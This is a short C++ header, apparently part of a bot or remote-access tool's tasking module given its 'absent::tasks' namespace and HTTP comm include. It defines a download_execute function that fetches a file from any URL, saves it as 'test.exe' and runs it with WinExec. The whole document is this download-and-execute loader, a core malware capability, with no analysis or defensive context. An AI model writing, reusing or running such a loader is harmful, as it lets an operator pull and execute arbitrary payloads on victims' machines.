#pragma once
#include "../comm/http.h"

namespace absent
{
	namespace tasks
	{
		bool download_execute(std::string url)
		{
			int res = absent::http::downloadFile(url, "test.exe");

			if (res == 0) { return false; }
			if (!WinExec("test.exe", 1)) { return false; }
			return true;
		}
	}
}